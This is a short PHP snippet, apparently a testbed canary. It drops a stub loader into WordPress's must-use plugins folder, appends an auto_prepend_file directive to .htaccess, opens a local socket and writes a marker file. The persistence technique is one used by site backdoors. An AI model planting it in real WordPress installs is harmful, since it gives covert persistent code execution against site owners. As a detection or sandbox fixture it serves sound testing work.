<?php
file_put_contents(WPMU_PLUGIN_DIR.'/loader.php', '<?php /* mu */');
file_put_contents(ABSPATH.'.htaccess', 'php_value auto_prepend_file loader.php', FILE_APPEND);
$s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b07','x'); // testbed canary: never runs
